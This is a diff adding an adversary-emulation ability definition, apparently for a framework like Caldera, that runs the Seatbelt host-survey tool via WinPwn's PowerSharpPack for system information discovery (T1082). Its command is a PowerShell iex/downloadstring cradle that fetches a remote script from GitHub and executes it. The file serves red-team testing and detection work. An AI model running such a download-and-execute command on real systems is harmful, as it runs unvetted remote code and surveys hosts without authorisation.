@@ -1,0 +1,22 @@
+- description: 'PowerSharpPack - Seatbelt technique via function of WinPwn.
+
+
+    [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs
+    a number of security oriented host-survey "safety checks" relevant from both offensive
+    and defensive security perspectives.'
+  id: 13addb79-9486-3a57-72a9-f54ffd1da34d
+  name: WinPwn - PowerSharpPack - Seatbelt
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');
+          Invoke-Seatbelt -Command "-group=all"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
